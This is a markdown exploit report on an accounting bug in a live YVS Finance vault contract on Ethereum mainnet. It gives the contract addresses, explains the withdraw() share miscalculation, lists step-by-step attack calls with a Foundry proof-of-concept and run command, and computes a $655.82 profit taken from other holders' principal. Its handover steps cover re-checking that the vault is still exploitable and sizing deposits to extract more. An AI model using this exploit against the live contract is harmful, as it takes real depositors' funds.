# EX-03 — YVS Finance: withdraw reward accounting inflates the withdrawer's share

**Net for an unprivileged actor:** **$655.82** per 1.7 LP deposit after 604,800 blocks (~84 days)
**Confidence:** MEDIUM — the accounting bug is proven on a fork, but the value depends on the vault's frozen state and the LP price
**Gate:** capital (1.7 LP + 0.021 LP donation) and an ~84-day lock
**Chain:** Ethereum mainnet (1)
**Status:** headline Hacken Critical-2 is PATCHED; this is a new live accounting bug.

## Contracts

| Role | Address |
|---|---|
| YvsVault | `0x981cc277841f06401B750a3c7dd42492ff962B9C` |
| LP token (Curve tBTC/sbtcCrv) | `0x64eda51d3Ad40D56b9dFc5554E06F94e1Dd786Fd` |
| Curve pool | `0xC25099792E9349C7DD09759744ea681C7de2cb66` |
| Strategy | `0xf44672da873f662AB8e1Fc904f8d053DAd9353DF` |

Live state at block 26,394,113: `totalSupply` 0.169114 shares; `totalDeposited` 0.162623 LP; `balance()` 0.160226 LP; `minDepositPeriod` 604,800 blocks (~84 days); `withdrawalFee` 25/10000.

## Bug

`withdraw(uint256 amount)` computes the withdrawer's reward share using `shares` read **before** the burn, but `totalSupply()` read **after** the burn. The reward share is therefore inflated by `T / (T - r)` (T = pre-burn supply, r = burned shares), and the extra reward is paid out of other holders' principal.

The vault is currently frozen for normal withdrawals because `balance() < totalDeposited()` makes `getRatio()`/`pendingRewards()` revert with a SafeMath underflow. A direct LP donation to the vault raises `balance()` without raising `totalDeposited()`, unfreezing the subtraction. The PoC uses a 0.021 LP donation, deposits 1.7 LP, waits 604,800 blocks, and withdraws.

## Step-by-step

```
transfer(VAULT, 0.021 LP)          // donation: balance() > totalDeposited()
approve(VAULT, 1.7 LP); deposit(1.7 LP)
roll(+604_800 blocks); warp(+604_800 * 12s)
withdraw(1.7 LP)                   // reward share uses pre-burn shares / post-burn supply
```

## PoC

`stage3/work/S3-080/2020_12_16_yvs_finance_sca_yvs_finance_erc20_staki_0x981cc2/poc/src/YvsVault.t.sol`

Key lines:

```solidity
IERC20(LP).transfer(VAULT, X);       // X = 0.021e18
IYvsVault(VAULT).deposit(D);         // D = 1.7e18
vm.roll(block.number + 604800 + 1);
IYvsVault(VAULT).withdraw(D);
assertGt(net, 0, "no profit");
```

Run:

```bash
cd stage3/work/S3-080/2020_12_16_yvs_finance_sca_yvs_finance_erc20_staki_0x981cc2/poc
ETH_RPC_URL=<ethereum-rpc> /workspaces/CA/research/tools/foundry/forge test \
  --match-test test_exploit -vv
```

Expected: attacker LP gain 0.14925 LP, USD value $655.82 at the 2026-11-11 prices in the PoC.

## Economics

- Capital: 1.7 LP + 0.021 LP donation; 84-day lock.
- Net: 0.14925 LP = $655.82 (at BTC $74,398 / ETH $2,078).
- The vault holds 0.1602 LP, so the prize is capped by the vault's LP balance and the number of other holders.
- The 0.021 LP donation is recovered as part of the withdrawal; the net figure already accounts for it.

## Evidence

- `evidence/live_state.txt` — totalSupply, totalDeposited, balance, LP balances, fees.
- `evidence/getsourcecode.json` — verified `YvsVault` source.
- `evidence/src/Main.sol`, `Strategy.sol`.
- PoC output: `evidence/poc_output.txt`.

## Risks / caveats

- The vault is frozen; the donation is what unfreezes the subtraction. If the vault is topped up or governance changes the ratio, the path may change.
- MEDIUM confidence because the value depends on the LP price and the vault's remaining LP; at a different LP price the USD net moves.
- The 84-day lock is a real capital cost; at current values the net is small.
- If the vault is drained or paused before withdrawal, the position is lost.

## Handover

1. Re-read the live vault state; confirm `balance() < totalDeposited()` and the donation still unfreezes.
2. Re-run the PoC at the latest block; recompute the LP→USD value.
3. Size the donation and deposit against the vault's LP balance; check whether a larger deposit extracts more.
4. Confirm the 604,800-block wait and the withdrawal fee.
